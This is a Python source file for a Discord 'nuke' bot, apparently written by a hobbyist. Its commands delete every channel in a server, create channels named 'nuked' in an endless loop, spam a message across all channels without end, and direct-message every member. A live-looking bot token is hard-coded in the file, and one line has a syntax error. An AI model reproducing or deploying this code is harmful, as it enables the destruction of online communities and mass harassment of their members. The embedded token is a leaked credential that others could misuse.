from operator import mod
import re
import random
import discord
from discord import embeds
from discord import colour
from discord import user
from discord import member
from discord import permissions
from discord.colour import Color 
from discord.ext import commands
from discord.ext.commands import bot
from discord.ext.commands.bot import Bot
from discord.ext.commands.core import after_invoke, command, cooldown, has_permissions
from discord.ext.commands.errors import BotMissingPermissions, MissingPermissions, MissingRequiredArgument
from discord.member import Member
from discord.utils import time_snowflake
from discord import Intents
from discord.ext import commands

client = commands.Bot(command_prefix = '.')
client.remove_command('help')
token = 'ODM1NTI2OTI1MTI3NTE2MjIx.YIQvFg.hdn7b7WgAI8S3-1XDeWYTXWd3Oo'

@client.event
async def on_ready():
    activity = discord.Game(name=".commands", type=3)
    await client.change_presence(status=discord.Status.online, activity=activity)
    print("iam ready!")


@client.command()
async def destroy (ctx):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted")
        except:
             pass
    for i in range(1):
        await guild.create_text_channel("nuked")
    while True:
        for channel in guild.text_channels:
            for i in range (1):
                await guild.create_text_channel("nuked")
 

@client.command()
async def s(ctx, *, message ):
  guild=ctx.message.guild
  await ctx.message.delete()
  for i in range(2):
    print("spammed")
    while True:
           for channel in guild.text_channels:
                 await channel.send(f"{message}")

@client.command()
async def cda(ctx):
    guild=ctx.message.guild
    await ctx.message.delete()
    
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
        except:
            pass   
@client.command()
async def dm(ctx, *,message):
    members=ctx.guild.members
    await ctx.message.delete()
    for member in members:
      try:
        await member.send(f"{message}")
      except:
         pass

@client.command()
async def commands(ctx):
  embed=discord.Embed(title="Commands", discord.Color.blue())
  embed.add_field(name=".cda",value="cda command for deleting all channels only")
  embed.add_field(name=".destroy",value="destroy command for deleting all channels and creating 1k channel called 'Nuked'")
  embed.add_field(name=".s",value="s command for spam u can spam by using .s (message) ..the bot will send your message in all channels in the guild")
  embed.set_footer(text="developed by Saad.")
  
  await ctx.send(embed=embed)
client.run(token)
